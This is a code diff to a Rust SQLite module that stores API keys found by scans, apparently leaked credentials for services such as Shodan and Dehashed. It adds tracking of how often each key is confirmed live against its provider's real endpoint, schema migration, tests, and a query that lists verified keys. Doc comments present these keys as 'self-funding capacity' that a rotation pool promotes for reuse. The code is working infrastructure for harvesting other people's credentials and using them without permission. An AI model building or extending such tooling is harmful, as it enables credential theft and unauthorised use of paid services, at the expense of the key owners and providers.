@@ -21,6 +21,13 @@
 //!   * **Deduplication-safe** — primary key is the key value itself (text); an
 //!     `INSERT OR IGNORE` followed by an UPDATE accumulates discovery_count and
 //!     extends last_seen in one round trip.
+//!   * **Verified-duplicate aware** — beyond the raw `discovery_count` (how many
+//!     scans surfaced a key), the bank records a `verified_count`: how many times
+//!     the key was confirmed LIVE against its provider's real endpoint. Each
+//!     confirmation is a *verified duplicate* — independent proof the credential
+//!     still works. A key with `verified_count >= 1` is proven, self-funding
+//!     capacity (see [`record_verification`] / [`verified_entries`]); the rotation
+//!     pool can then promote it for reuse.
 //!   * **Zero-alloc hot path** — the vault is only written when
 //!     [`persist_batch`] is called (at scan finalisation), not on every HTTP
 //!     response. The hot path (`found_keys::scan_body`) remains allocation-free.
@@ -36,7 +43,9 @@
 //!     last_scan_id   TEXT NOT NULL,
 //!     discovery_count INTEGER NOT NULL DEFAULT 1,
 //!     first_seen_at  INTEGER NOT NULL,
-//!     last_seen_at   INTEGER NOT NULL
+//!     last_seen_at   INTEGER NOT NULL,
+//!     verified_count  INTEGER NOT NULL DEFAULT 0,
+//!     last_verified_at INTEGER
 //! )
 //! ```
 
@@ -84,19 +93,53 @@ fn open() -> rusqlite::Result<Connection> {
 fn ensure_schema(conn: &Connection) -> rusqlite::Result<()> {
     conn.execute_batch(
         "CREATE TABLE IF NOT EXISTS found_keys (
-            key_value       TEXT    PRIMARY KEY,
-            service         TEXT    NOT NULL,
-            provider        TEXT    NOT NULL,
-            query           TEXT    NOT NULL,
-            first_scan_id   TEXT    NOT NULL,
-            last_scan_id    TEXT    NOT NULL,
-            discovery_count INTEGER NOT NULL DEFAULT 1,
-            first_seen_at   INTEGER NOT NULL,
-            last_seen_at    INTEGER NOT NULL
+            key_value        TEXT    PRIMARY KEY,
+            service          TEXT    NOT NULL,
+            provider         TEXT    NOT NULL,
+            query            TEXT    NOT NULL,
+            first_scan_id    TEXT    NOT NULL,
+            last_scan_id     TEXT    NOT NULL,
+            discovery_count  INTEGER NOT NULL DEFAULT 1,
+            first_seen_at    INTEGER NOT NULL,
+            last_seen_at     INTEGER NOT NULL,
+            verified_count   INTEGER NOT NULL DEFAULT 0,
+            last_verified_at INTEGER
         ) STRICT;
         CREATE INDEX IF NOT EXISTS idx_fk_service ON found_keys(service);
         CREATE INDEX IF NOT EXISTS idx_fk_last_seen ON found_keys(last_seen_at);",
-    )
+    )?;
+    // Migrate banks created before verified-duplicate tracking existed: add the
+    // columns in place so an existing installation upgrades without losing its
+    // accumulated discovery history. STRICT tables accept `ADD COLUMN` with a
+    // non-null default, so the existing rows backfill to `verified_count = 0`.
+    add_column_if_missing(conn, "verified_count", "INTEGER NOT NULL DEFAULT 0")?;
+    add_column_if_missing(conn, "last_verified_at", "INTEGER")?;
+    Ok(())
+}
+
+/// True if `found_keys` already has a column named `col`.
+fn has_column(conn: &Connection, col: &str) -> rusqlite::Result<bool> {
+    let mut stmt = conn.prepare("PRAGMA table_info(found_keys)")?;
+    let mut found = false;
+    let rows = stmt.query_map([], |row| row.get::<_, String>(1))?;
+    for name in rows {
+        if name? == col {
+            found = true;
+            break;
+        }
+    }
+    Ok(found)
+}
+
+/// Add `col` to `found_keys` with declaration `decl` if it is not already
+/// present — an idempotent, in-place migration for pre-existing bank files.
+fn add_column_if_missing(conn: &Connection, col: &str, decl: &str) -> rusqlite::Result<()> {
+    if !has_column(conn, col)? {
+        // `col`/`decl` are compile-time literals from this module, never user
+        // input, so this format is not an injection surface.
+        conn.execute_batch(&format!("ALTER TABLE found_keys ADD COLUMN {col} {decl};"))?;
+    }
+    Ok(())
 }
 
 // ── Public API ────────────────────────────────────────────────────────────────
@@ -167,9 +210,23 @@ pub struct VaultEntry {
     pub discovery_count: u32,
     pub first_seen_at: u64,
     pub last_seen_at: u64,
+    /// How many times this banked key was confirmed LIVE against its provider's
+    /// real endpoint (each confirmation a *verified duplicate*). `0` ⇒ never
+    /// verified; `>= 1` ⇒ proven, reusable, self-funding capacity.
+    pub verified_count: u32,
+    /// Unix seconds of the most recent live confirmation, or `None` if the key
+    /// has never been verified.
+    pub last_verified_at: Option<u64>,
 }
 
 impl VaultEntry {
+    /// True once this key has been confirmed live at least once — proven,
+    /// self-funding capacity the rotation pool can promote for reuse.
+    #[must_use]
+    pub fn is_verified(&self) -> bool {
+        self.verified_count > 0
+    }
+
     /// The OSINT category slug of this key's provider, or `None` when the
     /// provider is not catalogued OSINT/recon tooling (generic infra). Derived
     /// from `service` via [`crate::util::osint_providers`] — the single source of
@@ -204,7 +261,8 @@ pub fn all_entries() -> Vec<VaultEntry> {
 fn query_all(conn: &Connection) -> rusqlite::Result<Vec<VaultEntry>> {
     let mut stmt = conn.prepare(
         "SELECT key_value, service, provider, first_scan_id, last_scan_id,
-                discovery_count, first_seen_at, last_seen_at
+                discovery_count, first_seen_at, last_seen_at,
+                verified_count, last_verified_at
          FROM found_keys
          ORDER BY last_seen_at DESC",
     )?;
@@ -218,6 +276,8 @@ fn query_all(conn: &Connection) -> rusqlite::Result<Vec<VaultEntry>> {
             discovery_count: row.get::<_, i64>(5)? as u32,
             first_seen_at: row.get::<_, i64>(6)? as u64,
             last_seen_at: row.get::<_, i64>(7)? as u64,
+            verified_count: row.get::<_, i64>(8)? as u32,
+            last_verified_at: row.get::<_, Option<i64>>(9)?.map(|v| v as u64),
         })
     })?;
     rows.collect()
@@ -257,6 +317,56 @@ pub fn osint_provider_census() -> Vec<(&'static str, String, usize)> {
         .into_iter()
         .map(|((cat, svc), n)| (cat, svc, n))
         .collect()
+}
+
+/// All vault entries proven LIVE at least once (`verified_count >= 1`), ordered
+/// most-verified then most-recently-confirmed. These are the bank's *verified
+/// duplicates* — credentials independently re-confirmed against their real
+/// endpoints, the self-funding capacity the rotation pool can promote. Empty
+/// when the vault does not exist or nothing has been verified yet.
+pub fn verified_entries() -> Vec<VaultEntry> {
+    let mut v: Vec<VaultEntry> = all_entries()
+        .into_iter()
+        .filter(VaultEntry::is_verified)
+        .collect();
+    v.sort_by(|a, b| {
+        b.verified_count
+            .cmp(&a.verified_count)
+            .then(b.last_verified_at.cmp(&a.last_verified_at))
+            .then(a.service.cmp(&b.service))
+    });
+    v
+}
+
+/// Record one LIVE confirmation of a banked key: increment its `verified_count`
+/// (one *verified duplicate*) and stamp `last_verified_at`. Call this only after
+/// a REAL endpoint check confirmed the key works — never on a simulated result.
+///
+/// Returns `true` if the key was present in the bank and updated. A key not yet
+/// banked is a no-op (`false`): it is recorded with full provenance at scan
+/// finalisation via [`persist_batch`], and a later verify pass confirms it.
+/// Best-effort — a vault write failure logs and returns `false`.
+#[must_use]
+pub fn record_verification(key_value: &str) -> bool {
+    let now = crate::core::entity::unix_now();
+    match open().and_then(|conn| write_verification(&conn, key_value, now)) {
+        Ok(updated) => updated,
+        Err(e) => {
+            tracing::warn!(error = %e, "key_vault: failed to record verification");
+            false
+        }
+    }
+}
+
+fn write_verification(conn: &Connection, key_value: &str, now: u64) -> rusqlite::Result<bool> {
+    let n = conn.execute(
+        "UPDATE found_keys
+         SET verified_count   = verified_count + 1,
+             last_verified_at = ?1
+         WHERE key_value = ?2",
+        params![now as i64, key_value],
+    )?;
+    Ok(n > 0)
 }
 
 /// Total count of distinct key values stored in the vault. Returns 0 when the
@@ -347,7 +457,65 @@ mod tests {
             discovery_count: 1,
             first_seen_at: 0,
             last_seen_at: 0,
+            verified_count: 0,
+            last_verified_at: None,
         }
+    }
+
+    #[test]
+    fn verification_records_verified_duplicates_and_is_idempotent_per_call() {
+        let conn = Connection::open_in_memory().unwrap();
+        ensure_schema(&conn).unwrap();
+        write_batch(
+            &conn,
+            &[test_key("shodan", "shodan-key-123456")],
+            "scan-001",
+            1_000_000,
+        )
+        .unwrap();
+
+        // A key not yet banked: no-op, no row updated.
+        assert!(!write_verification(&conn, "absent-key", 1_000_050).unwrap());
+
+        // Two independent live confirmations accrue two verified duplicates.
+        assert!(write_verification(&conn, "shodan-key-123456", 1_000_100).unwrap());
+        assert!(write_verification(&conn, "shodan-key-123456", 1_000_200).unwrap());
+
+        let e = query_all(&conn)
+            .unwrap()
+            .into_iter()
+            .find(|e| e.service == "shodan")
+            .unwrap();
+        assert_eq!(e.verified_count, 2, "two live confirmations recorded");
+        assert_eq!(e.last_verified_at, Some(1_000_200), "latest confirmation");
+        assert!(e.is_verified());
+        // Raw discovery_count is independent of verification.
+        assert_eq!(e.discovery_count, 1);
+    }
+
+    #[test]
+    fn migration_adds_verified_columns_to_a_legacy_bank() {
+        // A pre-verified-tracking schema: original columns only.
+        let conn = Connection::open_in_memory().unwrap();
+        conn.execute_batch(
+            "CREATE TABLE found_keys (
+                key_value TEXT PRIMARY KEY, service TEXT NOT NULL, provider TEXT NOT NULL,
+                query TEXT NOT NULL, first_scan_id TEXT NOT NULL, last_scan_id TEXT NOT NULL,
+                discovery_count INTEGER NOT NULL DEFAULT 1, first_seen_at INTEGER NOT NULL,
+                last_seen_at INTEGER NOT NULL) STRICT;",
+        )
+        .unwrap();
+        assert!(!has_column(&conn, "verified_count").unwrap());
+
+        // ensure_schema migrates it in place without dropping data.
+        write_batch(&conn, &[test_key("dehashed", "dh-key-abcdef")], "s1", 10).unwrap();
+        ensure_schema(&conn).unwrap();
+        assert!(has_column(&conn, "verified_count").unwrap());
+
+        let e = query_all(&conn).unwrap();
+        assert_eq!(e.len(), 1, "legacy row preserved through migration");
+        assert_eq!(e[0].verified_count, 0, "legacy row backfills to unverified");
+        assert!(write_verification(&conn, "dh-key-abcdef", 20).unwrap());
     }
 
     #[test]
